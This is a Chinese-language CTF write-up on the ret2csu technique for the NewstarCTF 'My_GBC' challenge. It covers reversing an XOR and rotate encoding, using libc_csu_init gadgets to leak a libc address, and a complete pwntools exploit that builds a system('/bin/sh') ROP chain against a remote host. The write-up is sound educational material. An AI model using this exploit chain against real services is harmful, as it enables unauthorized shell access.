---
title: ret2csu
date: '2025-03-13 16:54:45'
updated: '2025-05-11 14:06:35'
---
## NewstarCTF My_GBC!!!!!
![](/images/d884f7b65265ebe333d3de0b69adaf8d.png)

从IDA可以看出，`read`函数读取的字节数很多可以栈溢出，但是有个`encrypt`函数把`buf`里面的数据加密了再存回原位  
这就导致原来的栈溢出payload无法实现该有功能，接着看`encrypt`函数内部，发现是对数据进行了左循环和异或的操作，可逆  
所以可以将要执行的payload先手进行右循环和异或之后传入：![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241017144318075.png)

```python
def ror(value,rotation,bits=8):
    rotation=rotation % bits
    return ((value >> rotation)|(value << (bits - rotation))) & ((1 << bits)-1)

def decrypt(value):
    res=ror(value,3)
    res=res^0x5A
    return long_to_bytes(res)

payload1_enc=b''
for i in range(len(payload1)):
    payload1_enc+=decrypt(payload1[i])
```

而且IDA里面还发现整个程序用的都是`write`函数，  
我们只能够利用`write`函数来泄露别的函数地址从而获得libc基址，实现ret2libc  
由于`write`函数有三个参数，  
所以我们需要利用gadget控制`rdi`、`rsi`、`rdx`三个寄存器的值，  
而通过`ROPgadget`指令可以发现程序当中并没有直接的`pop rdx`、`pop rsi`和`pop rdi`的指令：

（在IDA里面查看图中的`pop rdi`指令的地址可以发现其实是将`pop r15`的指令拆开了）

### 重点
不过在函数列表发现了`libc_csu_init`函数，汇编如下：

![](C:\Users\garhi\Pictures\微信截图_20241017143535.png)![](/images/70e2b7135112182072cbcae3e53c7cc4.png)

可以通过利用`csu1`部分和`csu2`部分来修改我们所需要的寄存器的内容从而达到`pop 对应寄存器`的效果：

！！！payload1讲解：

1、栈溢出返回至`csu1`部分的`pop rbx`指令，把0赋予`rbx`为了让后来call语句当中地址不受`rbx`影响

2、接着把1赋予`rbp`，后来rbx加1后与rbp相同从而不执行`jnz`语句

3、接着把1赋予`r12`，后来`r12`的值传给了`rdi`，`write`函数的第一个参数是文件描述符fd，1是标准输出即命令行输出

4、接着把从二进制文件当中获得的`read`函数的got表地址赋予r13，后来r13的值又传给了`rsi`，`write`函数的第二个参数是写入标准输出的数据来源缓冲区，有一个向地址内取值的操作，所以是got表而不是plt表

5、接着把8赋予`r14`，后来`r14`的值传给了`rdx`，`write`函数的第三个参数是读取字节数，8个字节够了

6、接着把从二进制文件中获得的`write`函数的got表地址赋予`r15`，也就是后来`call`语句后面的`[r15+rbx*8]`

（汇编语句当中"[ ]"表示地址，向地址内取值，所以这里填的`write`的got表）

7、跳到`csu2`部分的汇编指令继续执行

8、分别把`r14`、`r13`、`r12`的值传给了对应的寄存器，然后`call write`函数把`read`函数的真实地址输出了

9、由于没有`retn`语句，程序会接着往下执行到`csu1`部分的代码，但是我们这时需要返回到`main`函数当中，所以输入一些垃圾数据让接下来的几个`pop`指令pop掉，最后再接上`main`函数的返回地址，假装一切从未发生过（

这里有一个重点：有6个寄存器要pop掉，但是实际上payload里面塞了0x38(7*8)个'a'，这是因为在`pop`语句之前还有一个`add rsp,8`的语句将栈顶下移了八个字节，payload的0x38个'a'的前面8个是被跳过了没有被pop掉的

剩下的ret2libc步骤就跳过了，附上exp：（注意栈平衡）

```python
from pwn import *
from Crypto.Util.number import *

context.log_level='debug'

link=remote("8.147.129.74",34860)
# link=process("./mygbc") 
e=ELF("./mygbc")
libc=ELF("./libc.so.6")

csu1=0x4013AA
csu2=0x401390
pop_rdi=0x4013b3
ret=0x40101a

def ror(value,rotation,bits=8):
    rotation=rotation % bits
    return ((value >> rotation)|(value << (bits - rotation))) & ((1 << bits)-1)

def decrypt(value):
    res=ror(value,3)
    res=res^0x5A
    return long_to_bytes(res)

payload1=b'a'*0x18
payload1+=p64(csu1) #跳转到csu1部分
payload1+=p64(0)
payload1+=p64(1)
payload1+=p64(1)
payload1+=p64(e.got["read"])
payload1+=p64(8)
payload1+=p64(e.got["write"])
payload1+=p64(csu2)
payload1+=b'a'*0x38
payload1+=p64(e.sym["main"])

payload1_enc=b''
for i in range(len(payload1)):
    payload1_enc+=decrypt(payload1[i])

link.recvuntil("thing: ")
link.send(payload1_enc)

read_addr=u64(link.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base=read_addr-libc.sym["read"]
system=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b'/bin/sh'))

payload2=b'a'*0x18
payload2+=p64(ret)
payload2+=p64(pop_rdi)
payload2+=p64(binsh)
payload2+=p64(system)

payload2_enc=b''
for i in range(len(payload2)):
    payload2_enc+=decrypt(payload2[i])

link.send(payload2_enc)
link.interactive()
```

